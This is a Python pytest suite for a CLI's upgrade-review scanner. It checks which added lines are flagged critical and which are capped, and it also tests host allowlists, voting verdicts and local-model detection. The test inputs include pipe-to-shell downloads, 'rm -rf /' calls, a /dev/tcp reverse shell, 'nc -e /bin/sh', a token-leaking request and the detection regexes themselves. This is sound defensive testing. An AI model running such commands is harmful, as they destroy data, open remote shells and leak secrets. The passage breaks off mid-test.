"""Regression tests for the hivv CLI upgrade-review machinery + display helpers.

Why this suite exists
---------------------
2026-11-14 the review gate wedged the whole network: every bee blocked every
hub CLI update because

  1. the new file's OWN docstrings describing the false positive contained a
     literal download-pipe-shell example → old scanners flagged "critical",
  2. a PRINTED install hint (`opencode | bash`) was treated as executable code,
  3. `line_no` bookkeeping was off by one, and
  4. bytes literals (b"...") were not string-blanked.

Every test here encodes one of those failure modes (or a malicious pattern
that must STAY critical) so they cannot recur silently. The shipped-file
canaries fail the moment someone re-introduces a self-tripping line.

Run:  python3 -m pytest tests/ -q
      (no network, no $HOME writes — state goes to a temp dir)
"""
import importlib.util
import io
import json
import os
import re
import sys
import tempfile
import time
import urllib.error
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[1]
CLI_PATH = REPO / "public_html" / "hivv-cli.py"
SCRIPT_PATH = REPO / "scripts" / "emergency-update.py"

# Isolate ALL state before importing the CLI: the module resolves STATE_DIR at
# import time, so these must be set first. HUB points at a dead port so any
# accidental request fails fast instead of touching production.
_PRE_ENV = {k: os.environ.get(k) for k in ("HIVV_STATE_DIR", "HIVV_HUB")}
os.environ["HIVV_STATE_DIR"] = tempfile.mkdtemp(prefix="hivv-test-state-")
os.environ["HIVV_HUB"] = "http://127.0.0.1:1"


@pytest.fixture(scope="module", autouse=True)
def _restore_env_after_this_module():
    """Module-level os.environ writes leak into every test that runs later —
    test_tools_test_cmd's subprocess inherited HIVV_HUB=http://127.0.0.1:1
    and died with "Connection refused" (full suite red, 2026-11-24). Restore
    the moment this module's tests are done; during them nothing changes."""
    yield
    for _k, _v in _PRE_ENV.items():
        if _v is None:
            os.environ.pop(_k, None)
        else:
            os.environ[_k] = _v

_spec = importlib.util.spec_from_file_location("hivv_cli", str(CLI_PATH))
hivv = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(hivv)

# The exact download-into-shell pattern old bees use (kept in sync on purpose:
# if this regex ever changes, so must the shipped-file canaries).
PIPE_SHELL_RE = re.compile(
    r"(?:curl|wget)[^|;\n]*\|\s*(?:sudo\s+)?(?:ba|z|fi|da)?sh")


# ── helpers ──────────────────────────────────────────────────────────────
def scan(new: str, old: str = "") -> dict:
    return hivv._upgrade_static_scan(old.encode(), new.encode())


def findings(new: str, old: str = "") -> list:
    return scan(new, old)["findings"]


def severities(new: str, old: str = "") -> list:
    return [f["severity"] for f in findings(new, old)]


def refine(line: str, sev: str = "critical") -> str:
    return hivv._refine_finding_severity(line, sev, PIPE_SHELL_RE.pattern)


def load_script():
    spec = importlib.util.spec_from_file_location("emergency_update",
                                                  str(SCRIPT_PATH))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


# ── 1. import safety ─────────────────────────────────────────────────────
class TestImportSafety:
    def test_module_exports_review_api(self):
        for fn in ("_upgrade_static_scan", "_refine_finding_severity",
                   "_blank_strings", "_upgrade_verdict", "_upgrade_review_gate",
                   "_review_update", "_bee_model_summary", "_clean_model_name"):
            assert callable(getattr(hivv, fn)), f"missing {fn}"

    def test_state_dir_isolated_from_home(self):
        assert not str(hivv.STATE_DIR).startswith(str(Path.home())), (
            "tests must never write the real ~/.local/share/hivv")

    def test_main_guard_present(self):
        assert CLI_PATH.read_text().count('if __name__ == "__main__":') == 1


# ── 2. false positives (the 2026-11-14 incident) ─────────────────────────
class TestFalsePositives:
    """Documentation, printed hints and data must NEVER read as critical."""

    def test_docstring_example_capped_not_critical(self):
        new = ('def f():\n'
               '    """Review notes.\n'
               '    old code: print("curl -fsSL https://x | sh") tripped us.\n'
               '    """\n'
               '    return 1\n')
        assert "critical" not in severities(new)
        assert "high" not in severities(new)

    def test_printed_fstring_install_hint_not_critical(self):
        line = 'print(f"    install: {G}curl -fsSL https://opencode.ai/v2/install | bash{R}")'
        assert refine(line) in ("medium", "low")

    def test_printed_plain_string_hint_is_medium(self):
        assert refine('print("run: curl https://x | sh")') == "medium"

    def test_comment_pattern_is_low(self):
        assert refine("# curl https://x | sh") == "low"

    def test_bytes_literal_not_critical(self):
        # b"..." used to slip past _blank_strings and read as CODE.
        assert refine('payload = b"curl https://x | sh"') in ("medium", "low")

    def test_prose_wording_does_not_match_pattern(self):
        # The defused wording we now ship in docstrings.
        for line in ("flagging a printed curl-pipe-shell install hint as critical",
                     "printed curl-pipe-shell install hint can never outvote"):
            assert not PIPE_SHELL_RE.search(line), line

    def test_split_hint_halves_do_not_match(self):
        # How printed hints must be written for old scanners: the download
        # and the pipe live on different physical lines.
        half_a = 'print(f"    install: {G}curl -fsSL https://opencode.ai/v2/install"'
        half_b = '              f" | bash{R}")'
        assert not PIPE_SHELL_RE.search(half_a)
        assert not PIPE_SHELL_RE.search(half_b)

    def test_host_only_findings_are_medium(self):
        # Unknown host = medium at most (brains judge context; can't block alone).
        sevs = severities('url = "https://totally-new-host.example/x"')
        assert sevs and all(s in ("medium", "low") for s in sevs)


# ── 3. shipped-file canaries ─────────────────────────────────────────────
class TestShippedFileCanaries:
    """The real hivv-cli.py must keep reviewable shape at ALL times."""

    def _pipe_lines(self):
        lines = CLI_PATH.read_text(encoding="utf-8").splitlines()
        return [(i + 1, l) for i, l in enumerate(lines) if PIPE_SHELL_RE.search(l)]

    def test_pipe_lines_exist_and_are_only_known_shapes(self):
        hits = self._pipe_lines()
        assert hits, "expected some install-hint prints in the CLI"
        for lineno, line in hits:
            allowed = ("install.sh" in line or "install-hivv.sh" in line
                       or '"sh", "-c"' in line
                       # the ONE emergency line — a curated install-hint
                       # shape, like the install.sh forms above: the tip,
                       # doctor and rescue docs all quote it verbatim
                       or "/rescue" in line)
            assert allowed, (
                f"line {lineno} contains the download-pipe-shell pattern but is "
                f"not an install hint or the known argv exec:\n  {line}")

    def test_pipe_lines_refine_noncritical_unless_argv_exec(self):
        for lineno, line in self._pipe_lines():
            sev = refine(line, "critical")
            if '"sh", "-c"' in line:
                assert sev == "critical", (
                    f"line {lineno}: real shell exec must stay critical")
            else:
                assert sev in ("medium", "low"), (
                    f"line {lineno}: printed hint capped, got {sev}: {line}")

    def test_no_bare_selftrip_literal(self):
        # The exact prose that re-tripped old scanners on 2026-11-14.
        text = CLI_PATH.read_text(encoding="utf-8")
        assert '`print("curl … | sh")`' not in text
        assert 'print("curl … | sh")' not in text

    def test_host_allowlist_covers_shipped_hosts(self):
        for host in ("hivv.org", "opencode.ai", "tailscale.com", "ollama.com"):
            assert host in hivv._UPGRADE_HOST_ALLOW, host

    def test_full_scan_from_empty_has_no_critical_above_truncation(self):
        # Smoke canary: with an empty base every line counts as added. The
        # scanner bounds pathological diffs (6000 lines) — whatever it does
        # return must not be critical-from-documentation.
        r = hivv._upgrade_static_scan(b"", CLI_PATH.read_bytes())
        assert r["added"] > 6000 and r["truncated"] is True
        for f in r["findings"]:
            assert f["severity"] in ("medium", "low"), f


# ── 4. true positives (must stay blocking) ───────────────────────────────
class TestTruePositives:
    """Malicious/ dangerous shapes must keep their critical/high severity —
    otherwise defusing false positives would blind the scanner."""

    def test_sh_dash_c_argv_stays_critical(self):
        assert refine('cmd = ["sh", "-c", "curl http://x/y | sh"]') == "critical"

    def test_subprocess_shell_true_stays_critical(self):
        assert refine('subprocess.run("wget -qO- http://x | sh", shell=True)') == "critical"

    def test_os_system_stays_critical(self):
        assert refine('os.system("curl http://x | sh")') == "critical"

    @pytest.mark.parametrize("code", [
        "os.system('rm -rf /usr')",
        "subprocess.run('rm -rf /', shell=True)",
        "subprocess.call('rm -rf /var/lib/x', shell=True)",
    ])
    def test_recursive_system_delete_flagged_critical(self, code):
        fs = findings(f"import os\n{code}\n")
        assert any(f["severity"] == "critical" for f in fs), fs

    def test_rm_pattern_scoped_to_system_paths(self):
        rm = re.compile(r"\brm\s+-[a-z]*r[a-z]*f?\s+/(?:\s|$|['\"\)]|etc|usr|home|var|boot)")
        assert rm.search("rm -rf /usr")
        assert rm.search("rm -rf /")
        assert not rm.search("rm -rf ./build")

    def test_bash_reverse_shell_flagged_critical(self):
        fs = findings("exec 3<>/dev/tcp/10.0.0.1/4444\n")
        assert any(f["severity"] == "critical" and "reverse-shell" in f["why"]
                   for f in fs), fs

    def test_netcat_exec_flagged_critical(self):
        fs = findings("nc -e /bin/sh 10.0.0.1 4444\n")
        assert any(f["severity"] == "critical" and "netcat" in f["why"]
                   for f in fs), fs
        # plain port scan must not trip it
        assert not any("netcat" in f["why"] for f in findings("nc -z host 22\n"))

    def test_raw_socket_connect_bare_ip_flagged_critical(self):
        # `socket.socket(...).connect(("1.2.3.4", …))` — the parens-crossing
        # shape the old [^)\n]* pattern could never match.
        fs = findings('sock = socket.socket().connect(("10.9.8.7", 4444))\n')
        assert any(f["severity"] == "critical" and "bare IP" in f["why"]
                   for f in fs), fs

    def test_socket_connect_to_hostname_not_flagged(self):
        fs = findings('sock = socket.socket().connect(("example.com", 4444))\n')
        assert not any("bare IP" in f["why"] for f in fs)

    def test_secret_exfiltration_stays_critical(self):
        line = ('req = urllib.request.Request(u, headers={"a": HIVV_CONTROL_TOKEN})'
                '; urllib.request.urlopen(req)\n')
        fs = findings(line)
        assert any(f["severity"] == "critical" and "secret" in f["why"]
                   for f in fs), fs

    def test_eval_stays_high(self):
        fs = findings("eval(user_input)\n")
        assert any(f["severity"] == "high" and "dynamic code" in f["why"]
                   for f in fs), fs

    def test_pickle_deser_stays_high(self):
        fs = findings("data = pickle.loads(raw)\n")
        assert any(f["severity"] == "high" and "deserializes" in f["why"]
                   for f in fs), fs

    def test_persistence_via_cron_stays_high_with_exec_consumer(self):
        fs = findings("import os\nos.system('crontab -r')\n")
        assert any(f["severity"] == "high" and "persists" in f["why"]
                   for f in fs), fs

    def test_ssh_key_touch_is_at_least_medium(self):
        fs = findings('path = "~/.ssh/id_rsa"\n')
        ssh = [f for f in fs if "SSH" in f["why"]]
        assert ssh and all(f["severity"] in ("medium", "high", "critical")
                           for f in ssh)


# ── 5. _blank_strings / _refine_finding_severity units ───────────────────
class TestBlankStrings:
    def test_fstring_blanked(self):
        assert "curl" not in hivv._blank_strings('x = f"curl a | sh"')

    def test_raw_string_blanked(self):
        assert "curl" not in hivv._blank_strings('x = r"curl a | sh"')

    def test_bytes_and_combo_prefixes_blanked(self):
        for lit in ('b"curl a | sh"', 'br"curl a | sh"', 'rb"curl a | sh"',
                    'fr"curl a | sh"', 'rf"curl a | sh"'):
            assert "curl" not in hivv._blank_strings(f"x = {lit}"), lit

    def test_single_line_triple_blanked(self):
        assert "curl" not in hivv._blank_strings('x = """curl a | sh"""')

    def test_comment_stripped(self):
        assert "curl" not in hivv._blank_strings("code = 1  # curl a | sh")

    def test_escaped_quote_does_not_leak(self):
        out = hivv._blank_strings(r'x = "say \"curl a | sh"')
        assert "curl" not in out

    def test_code_outside_strings_survives(self):
        assert "wget_count" in hivv._blank_strings("total = wget_count + 1")


class TestRefineMatrix:
    def test_comment_low(self):
        assert refine("# wget a | sh") == "low"

    def test_string_only_medium(self):
        assert refine('msg = "wget a | sh"') == "medium"

    def test_code_pattern_keeps_original(self):
        # matches the pipe pattern in REAL code (no strings involved)
        assert refine("total = wget_ok | shutil_dir", "critical") == "critical"

    def test_exec_consumer_keeps_original(self):
        assert refine('p = subprocess.run("wget a | sh")', "critical") == "critical"

    def test_argv_form_checked_raw(self):
        assert refine('args = ["zsh", "-c", "wget a | sh"]', "critical") == "critical"


# ── 6. host allowlist ────────────────────────────────────────────────────
class TestHostAllowlist:
    def _host_findings(self, new):
        return [f for f in findings(new) if "outbound host" in f["why"]]

    def test_known_hosts_allowed(self):
        for url in ("https://hivv.org/api", "https://sub.hivv.org/x",
                    "https://raw.githubusercontent.com/o/r/f",
                    "https://opencode.ai/install",
                    "http://127.0.0.1:8080/v1"):
            assert self._host_findings(f'u = "{url}"') == [], url

    def test_unknown_host_flagged_medium(self):
        fs = self._host_findings('u = "https://new-vendor.example/api"')
        assert len(fs) == 1 and fs[0]["severity"] == "medium"
        assert "new-vendor.example" in fs[0]["why"]

    def test_lookalike_domain_flagged(self):
        # hivv.org.evil.example is NOT ours
        fs = self._host_findings('u = "https://hivv.org.evil.example/x"')
        assert len(fs) == 1

    def test_subdomain_of_allowed_host_allowed(self):
        assert self._host_findings('u = "https://api.hivv.org/v1"') == []

    def test_schemeless_ip_not_a_host_finding(self):
        assert self._host_findings("host = 192.168.1.50") == []

    def test_schemed_ip_flagged(self):
        fs = self._host_findings('u = "http://192.168.1.50:8080/v1"')
        assert len(fs) == 1 and fs[0]["severity"] == "medium"


# ── 7. diff semantics ────────────────────────────────────────────────────
class TestDiffSemantics:
    def test_only_added_lines_scanned(self):
        old = 'bad = "curl http://x | sh"\n'
        r = scan("good = 1\n", old=old)
        assert not r["findings"] and r["removed"] == 1

    def test_unchanged_dangerous_line_not_rescanned(self):
        line = 'x = 1\nbad = "curl http://x | sh"\n'
        r = scan(line, old=line)
        assert not r["findings"] and r["added"] == 0 == r["removed"]

    def test_added_line_numbering_exact(self):
        old = "line1\nline2\nline3\n"
        new = old + 'cmd = ["sh", "-c", "curl http://x/y | sh"]\nline5\n'
        fs = scan(new, old=old)["findings"]
        assert fs, "expected findings for the added exec line"
        assert all(f["line_no"] == 4 for f in fs), fs  # 4th line of new file

    def test_top_insert_numbering_exact(self):
        old = "line1\nline2\n"
        new = 'bad = "curl http://x | sh"\n' + old
        fs = [f for f in scan(new, old=old)["findings"]
              if "pipes a download" in f["why"]]
        assert fs and all(f["line_no"] == 1 for f in fs), fs

    def test_counts(self):
        old = "a\nb\nc\n"
        new = "a\nB\nc\nd\ne\n"
        r = scan(new, old=old)
        assert (r["added"], r["removed"]) == (3, 1)

    def test_truncation_bounds_mega_diffs(self):
        new = "\n".join(f"x = {i}" for i in range(6100)) + "\n"
        r = scan(new)
        assert r["truncated"] is True and r["added"] == 6100

    def test_pattern_and_host_can_both_report_one_line(self):
        line = 'u = "https://new-host.example" + " curl http://x | sh"'
        fs = findings(line)
        assert any("pipes a download" in f["why"] for f in fs)
        assert any("outbound host" in f["why"] for f in fs)


# ── 8. verdict combination ───────────────────────────────────────────────
class TestVerdict:
    CRIT = {"findings": [{"severity": "critical", "why": "pipes a download straight into a shell"}]}
    MED = {"findings": [{"severity": "medium", "why": "new outbound host not in allowlist: x"}]}
    HIGH = {"findings": [{"severity": "high", "why": "touches SSH keys"}]}
    CLEAN = {"findings": []}
    V_OK = [{"verdict": "ok", "brain": "a"}]
    V_SUS = [{"verdict": "suspicious", "brain": "b"}]

    def test_critical_always_suspicious_even_with_ok_votes(self):
        v, why = hivv._upgrade_verdict(self.CRIT, self.V_OK * 3)
        assert v == "suspicious" and "critical pattern" in why

    def test_medium_never_blocks_alone(self):
        v, _ = hivv._upgrade_verdict(self.MED, [])
        assert v == "ok"

    def test_majority_suspicious_blocks(self):
        v, why = hivv._upgrade_verdict(self.CLEAN, self.V_SUS * 2 + self.V_OK)
        assert v == "suspicious" and "flagged it" in why

    def test_tie_goes_ok_confirmation_round_will_break_it(self):
        v, _ = hivv._upgrade_verdict(self.CLEAN, self.V_SUS + self.V_OK)
        assert v == "ok"

    def test_minority_suspicion_ok(self):
        v, _ = hivv._upgrade_verdict(self.CLEAN, self.V_OK * 2 + self.V_SUS)
        assert v == "ok"

    def test_no_brains_high_blocks(self):
        v, why = hivv._upgrade_verdict(self.HIGH, [])
        assert v == "suspicious" and "static high" in why

    def test_no_brains_clean_passes(self):
        v, why = hivv._upgrade_verdict(self.CLEAN, [])
        assert v == "ok" and "static scan clean" in why

    def test_no_brains_medium_only_passes(self):
        v, _ = hivv._upgrade_verdict(self.MED, [])
        assert v == "ok"


# ── 9. review gate (network mocked out) ──────────────────────────────────
class TestGate:
    @pytest.fixture(autouse=True)
    def isolated(self, monkeypatch, tmp_path):
        # fresh state per test, review + hub report stubbed
        box = {}
        monkeypatch.setattr(hivv, "read_state", lambda: dict(box))
        monkeypatch.setattr(hivv, "write_state",
                            lambda s: box.clear() or box.update(s))
        self.reported = []
        monkeypatch.setattr(
            hivv, "_upgrade_report_once",
            lambda payload, sha, action, timeout=6.0: (
                self.reported.append((action, payload, sha)) or True))
        self.reviews = 0
        return box

    def _review_result(self, verdict, reason="r"):
        def fake(old, new, *, source="manual", echo=None, budget_s=60):
            self.reviews += 1
            return {"verdict": verdict, "reason": reason,
                    "scan": {"findings": [], "added": 0, "removed": 0,
                             "truncated": False},
                    "votes": [], "source": source}
        return fake

    def _gate(self, monkeypatch, verdict="ok", **kw):
        monkeypatch.setattr(hivv, "_review_update",
                            self._review_result(verdict, kw.pop("reason", "r")))
        return hivv._upgrade_review_gate(b"unique-bytes-" + verdict.encode(),
                                         source="manual", **kw)

    def test_ok_gate_allows(self, monkeypatch):
        g = self._gate(monkeypatch, "ok")
        assert g["allow"] is True and g["verdict"] == "ok"

    def test_suspicious_blocks_and_reports_once(self, monkeypatch):
        g = self._gate(monkeypatch, "suspicious", reason="bad stuff")
        assert g["allow"] is False and g["verdict"] == "suspicious"
        assert "bad stuff" in g["reason"]
        assert self.reported and self.reported[0][0] == "blocked"

    def test_force_allows_suspicious_but_keeps_verdict(self, monkeypatch):
        g = self._gate(monkeypatch, "suspicious", force=True)
        assert g["allow"] is True and g["verdict"] == "suspicious"
        # gate itself must not report "blocked" on a forced apply
        assert not self.reported

    def test_second_call_hits_verdict_cache(self, monkeypatch):
        monkeypatch.setattr(hivv, "_review_update",
                            self._review_result("ok"))
        payload = b"cache-bytes-v1"
        echoes = []
        hivv._upgrade_review_gate(payload, source="auto", echo=echoes.append)
        assert self.reviews == 1
        hivv._upgrade_review_gate(payload, source="auto", echo=echoes.append)
        assert self.reviews == 1, "cached sha must not be re-reviewed"
        assert any("cached" in e for e in echoes)

    def test_cached_suspicious_still_blocks_without_force(self, monkeypatch):
        monkeypatch.setattr(hivv, "_review_update",
                            self._review_result("suspicious", reason="cache says no"))
        payload = b"cache-bytes-sus"
        hivv._upgrade_review_gate(payload, source="auto")
        g = hivv._upgrade_review_gate(payload, source="auto")
        assert g["allow"] is False and self.reviews == 1

    def test_review_error_never_wedges_update(self, monkeypatch):
        # The guarantee lives inside _review_update: ANY machinery exception
        # degrades to "ok + review error (continuing)" instead of blocking —
        # sha256 + healthcheck still guard the apply.
        def boom(*a, **k):
            raise RuntimeError("brains exploded")
        monkeypatch.setattr(hivv, "_upgrade_static_scan", boom)
        r = hivv._review_update(b"old", b"new", source="auto")
        assert r["verdict"] == "ok"
        assert "review error" in r["reason"]

    def test_review_error_result_passes_gate(self, monkeypatch):
        # gate consumes the degraded result shape and still allows.
        def fake(old, new, *, source="manual", echo=None, budget_s=60):
            self.reviews += 1
            return {"verdict": "ok", "reason": "review error (continuing): x",
                    "scan": {"findings": [], "added": 0, "removed": 0},
                    "votes": [], "source": source}
        monkeypatch.setattr(hivv, "_review_update", fake)
        g = hivv._upgrade_review_gate(b"error-bytes", source="auto")
        assert g["allow"] is True
        assert "review error" in g["reason"]

    def test_gate_returns_full_structure(self, monkeypatch):
        g = self._gate(monkeypatch, "ok")
        assert set(g) >= {"allow", "verdict", "reason", "review"}
        assert "scan" in g["review"] and "votes" in g["review"]


# ── 10. emergency network update script ──────────────────────────────────
class TestEmergencyScript:
    def test_targets_online_only(self):
        mod = load_script()
        nodes = [{"name": "a", "status": "online"},
                 {"name": "b", "status": "stale"},
                 {"name": "c", "status": "offline"},
                 {"name": "d", "status": "online"}]
        assert mod._targets(nodes) == ["a", "d"]

    def test_targets_node_filter(self):
        mod = load_script()
        nodes = [{"name": "a", "status": "online"},
                 {"name": "b", "status": "online"}]
        assert mod._targets(nodes, ["b"]) == ["b"]
        assert mod._targets(nodes, ["zzz"]) == []

    def test_targets_name_falls_back_to_id(self):
        mod = load_script()
        nodes = [{"id": "n-1", "status": "online"}]
        assert mod._targets(nodes) == ["n-1"]

    def test_targets_tolerates_junk(self):
        mod = load_script()
        assert mod._targets(None) == []
        assert mod._targets([None, 42, {}, {"status": "online"}]) == []

    def test_script_has_main_guard(self):
        assert 'if __name__ == "__main__":' in SCRIPT_PATH.read_text()


# ── 11. repair-plan allowlists (the emergency lever's guardrails) ────────
class TestRepairAllowlist:
    def test_repair_ops_is_exact_allowlist(self):
        # A hole here = arbitrary code via "signed" plans. selftest = the
        # deliberate NON-shell remote op (runs a fixed battery, reports back).
        # bootstrap_user_install = the escape hatch for a box whose CLI is
        # too old to update itself: it writes the CURRENT client into the
        # USER's own install (~/.local), never the root-owned one, and never
        # escalates privilege.
        assert hivv.REPAIR_OPS == {"cli_update", "agent_restart",
                                   "reap_duplicates", "service_restart",
                                   "selftest", "bootstrap_user_install"}

    def test_the_hub_signs_the_same_allowlist(self):
        # The hub is what signs the plans — if its allowlist and the bee's
        # disagree, one side refuses a plan the other happily made.
        hub = (REPO / "api" / "routes" / "control-routes.js").read_text()
        for op in sorted(hivv.REPAIR_OPS):
            assert f"'{op}'" in hub, f"the hub does not allow the '{op}' repair op"

    def test_repair_units_is_finite_allowlist(self):
        units = getattr(hivv, "REPAIR_UNITS", None)
        assert units is not None and len(units) <= 20
        assert "llama.service" in units

    def test_only_cli_update_takes_force(self):
        # cmd_repair refuses --force on anything but cli_update — pin the rule.
        src = CLI_PATH.read_text()
        assert '--force only applies to --op cli_update' in src


# ── 12. display helpers: models by bee ───────────────────────────────────
class TestBeeModelSummary:
    NODES = [
        {"name": "yalla", "status": "online",
         "local_models": [{"provider": "llama.cpp:8080", "model": "gemma-4-2b"},
                          {"provider": "ollama", "model": "qwen2.5:0.5b"}]},
        {"name": "masjid", "status": "offline",
         "local_models": [{"provider": "llama.cpp:8081", "model": "gemma-E2B"}]},
        {"name": "empty", "status": "online", "local_models": []},
    ]

    def test_models_rendered_per_bee(self):
        lines = hivv._bee_model_summary(self.NODES)
        assert len(lines) == 3  # yalla + masjid + explicit empty line
        assert "yalla" in lines[0] and "gemma-4-2b" in lines[0]
        assert "qwen2.5:0.5b" in lines[0] and "llama.cpp:8080" in lines[0]

    def test_online_empty_gets_explicit_none_line(self):
        # the 2026-11-14 "why only one bee?" question: empties must be VISIBLE
        lines = hivv._bee_model_summary(self.NODES)
        assert any("empty" in l and "(no local models reported)" in l
                   for l in lines), lines

    def test_offline_empty_stays_hidden(self):
        nodes = self.NODES + [{"name": "ghost", "status": "offline",
                               "local_models": []}]
        lines = hivv._bee_model_summary(nodes)
        assert not any("ghost" in l for l in lines)

    def test_offline_marked(self):
        lines = hivv._bee_model_summary(self.NODES)
        assert "[offline]" in lines[1]

    def test_online_unmarked(self):
        lines = hivv._bee_model_summary(self.NODES)
        assert "[offline]" not in lines[0]

    def test_junk_input_safe(self):
        assert hivv._bee_model_summary(None) == []
        assert hivv._bee_model_summary([None, 7, {}]) == []

    def test_missing_fields_render_question_marks(self):
        lines = hivv._bee_model_summary(
            [{"local_models": [{}], "status": "online"}])
        assert len(lines) == 1 and "?" in lines[0]

    def test_long_line_truncated(self):
        nodes = [{"name": "n", "status": "online",
                  "local_models": [{"model": "x" * 300, "provider": "llama.cpp"}]}]
        line = hivv._bee_model_summary(nodes, width=60)[0]
        assert len(line) <= 60 and line.endswith("…")

    def test_name_falls_back_to_id(self):
        lines = hivv._bee_model_summary(
            [{"id": "node-9", "status": "online", "local_models": [{"model": "m"}]}])
        assert "node-9" in lines[0]


# ── 13. model-name cleanup (feeds the by-bee display + heartbeats) ───────
class TestCleanModelName:
    def test_hf_cache_path(self):
        raw = ("/home/u/.cache/huggingface/hub/models--unsloth--gemma-4/blobs/"
                + "a" * 64)
        assert hivv._clean_model_name(raw) == "unsloth/gemma-4"

    def test_sha256_short_id(self):
        assert hivv._clean_model_name("b" * 64) == "model:bbbbbbbb"

    def test_clean_passthrough(self):
        assert hivv._clean_model_name("llama3.1:8b") == "llama3.1:8b"

    def test_empty_is_unknown(self):
        assert hivv._clean_model_name("") == "unknown"
        assert hivv._clean_model_name("unknown") == "unknown"

    def test_path_takes_last_segment(self):
        assert hivv._clean_model_name("/opt/models/my-model.gguf") == "my-model.gguf"

    def test_hf_path_with_different_org(self):
        raw = "models--Qwen--Qwen2.5-0.5B-Instruct-GGUF/blobs/" + "c" * 64
        assert hivv._clean_model_name(raw) == "Qwen/Qwen2.5-0.5B-Instruct-GGUF"


# ── 14. local-LLM detection (heartbeat truth: 8090 + keyed servers) ──────
class _FakeHTTPResponse:
    def __init__(self, body: bytes):
        self._body = body

    def read(self):
        return self._body

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


def _fake_urlopen(responses: dict):
    """urlopen double: {url-substring: bytes | Exception}; unmatched ports
    behave like a closed port (connection refused)."""
    def fake(req, *args, **kwargs):
        url = getattr(req, "full_url", str(req))
        for key, val in responses.items():
            if key in url:
                if isinstance(val, BaseException):
                    raise val
                return _FakeHTTPResponse(val)
        raise ConnectionRefusedError("closed port")
    return fake


def _http_error(url: str, code: int, body: bytes) -> urllib.error.HTTPError:
    return urllib.error.HTTPError(url, code, "err", None, io.BytesIO(body))


class TestDetectLocalAi:
    def _detect(self, monkeypatch, responses):
        monkeypatch.setattr("urllib.request.urlopen", _fake_urlopen(responses))
        return hivv._detect_local_ai()

    def test_llama_on_8090_detected(self, monkeypatch):
        # ashy's case: llama runs on 8090 (8080 owned by Next.js)
        body = json.dumps({"data": [
            {"id": "models--org--cool/blobs/" + "a" * 64}]}).encode()
        res = self._detect(monkeypatch, {":8090/v1/models": body})
        hit = [m for m in res if m.get("port") == 8090]
        assert hit and hit[0]["provider"] == "llama.cpp:8090"
        assert hit[0]["model"] == "org/cool"
        assert not hit[0].get("locked")

    def test_keyed_llama_reported_locked(self, monkeypatch):
        # yalla's case: llama --api-key answers 401 — must NOT vanish
        err = _http_error(
            "http://localhost:8080/v1/models", 401,
            b'{"error":{"message":"Invalid API Key","type":"authentication_error","code":401}}')
        res = self._detect(monkeypatch, {":8080/v1/models": err})
        hit = [m for m in res if m.get("port") == 8080]
        assert hit, res
        assert hit[0]["locked"] is True
        assert "api-key" in hit[0]["model"]
        assert hit[0]["provider"] == "llama.cpp:8080"

    def test_webapp_401_not_misread_as_llama(self, monkeypatch):
        # FastAPI-style 401 on a non-LLM app must not become a fake llama
        err = _http_error("http://localhost:8081/v1/models", 401,
                          b'{"detail":"Not authenticated"}')
        res = self._detect(monkeypatch, {":8081/v1/models": err})
        assert [m for m in res if m.get("port") == 8081] == []

    def test_webapp_html_skipped(self, monkeypatch):
        # ashy's 8080 Next.js page — garbage-in, empty-out
        res = self._detect(monkeypatch, {
            ":8080/v1/models": b"<!DOCTYPE html><html><body>hi</body></html>"})
        assert [m for m in res if m.get("port") == 8080] == []

    def test_lm_studio_port_labeled(self, monkeypatch):
        body = json.dumps({"data": [{"id": "some-model"}]}).encode()
        res = self._detect(monkeypatch, {":1234/v1/models": body})
        hit = [m for m in res if m.get("port") == 1234]
        assert hit and hit[0]["provider"] == "lm-studio:1234"

    def test_ollama_detected(self, monkeypatch):
        tags = json.dumps({"models": [{"name": "qwen2.5:0.5b", "size": 123}]}).encode()
        res = self._detect(monkeypatch, {":11434/api/tags": tags})
        hit = [m for m in res if m.get("provider") == "ollama"]
        assert hit and hit[0]["model"] == "qwen2.5:0.5b" and hit[0]["loaded"] is True

    def test_closed_ports_stay_silent(self, monkeypatch):
        assert self._detect(monkeypatch, {}) == []

    def test_locked_entries_excluded_from_brain_urls(self, monkeypatch):
        # a keyed server would only 401 the review brain — skip it
        monkeypatch.setattr(hivv, "_detect_local_ai", lambda: [
            {"provider": "llama.cpp:8080", "model": "locked (api-key required)",
             "locked": True, "port": 8080},
            {"provider": "llama.cpp:8090", "model": "real-model",
             "loaded": True, "port": 8090},
        ])
        monkeypatch.setattr("urllib.request.urlopen", _fake_urlopen({}))
        urls = hivv._local_brain_urls()
        labels = [lbl for lbl, _ in urls]
        assert not any("locked" in l for l in labels)
        assert any("8090" in l for l in labels)


# ── 15. review prompt sanity (brains get context) ────────────────────────
class TestReviewPrompt:
    def test_prompt_flags_expected_benign(self):
        p = hivv._REVIEW_PROMPT
        assert "{diff}" in p
        assert "SELF-UPDATING" in p
        assert "VERDICT: SUSPICIOUS" in p

    def test_confirm_prompt_demands_evidence(self):
        c = hivv._REVIEW_CONFIRM
        assert "{objection}" in c and "{diff}" in c
        assert "CONCRETE" in c

    def test_patterns_table_shape(self):
        assert hivv._UPGRADE_RISK_PATTERNS
        for pat, sev, why in hivv._UPGRADE_RISK_PATTERNS:
            assert sev in ("critical", "high", "medium")
            assert why and isinstance(why, str)
            re.compile(pat)  # must be valid regex


# ── 16. confirmation-round wiring (tie-breaker, evidence demand) ──────────
class TestConfirmationRound:
    """End-to-end _review_update confirmation behaviour: vote-only suspicion
    (clean static scan) must ALWAYS face the adversarial re-ask — majority,
    unanimous, or TIE — and only concrete evidence stands."""

    @staticmethod
    def _vote(verdict, brain, via, reason="initial vibe"):
        return {"verdict": verdict, "brain": brain, "via": via,
                "reason": reason, "ms": 5}

    def _run(self, monkeypatch, local_votes, hive_votes, confirm_verdict,
             static_findings=None, track_http=None):
        import hmac as _hmac  # noqa: F401  (keep linters quiet about local imports)
        state = {"asks": []}
        monkeypatch.setattr(
            hivv, "_upgrade_static_scan",
            lambda o, n: {"findings": static_findings or [], "added": 1,
                          "removed": 0, "truncated": False})
        monkeypatch.setattr(hivv, "_review_local_brains",
                            lambda *a, **k: list(local_votes))
        monkeypatch.setattr(hivv, "_review_hive_brains",
                            lambda *a, **k: list(hive_votes))

        def fake_ask(url, prompt, timeout=30.0):
            state["asks"].append(prompt)
            return {"verdict": confirm_verdict, "reason": "re-evaluated on demand",
                    "ms": 3}
        monkeypatch.setattr(hivv, "_ask_review_brain", fake_ask)
        monkeypatch.setattr(hivv, "_local_brain_urls",
                            lambda *a, **k: [("local:port:8090",
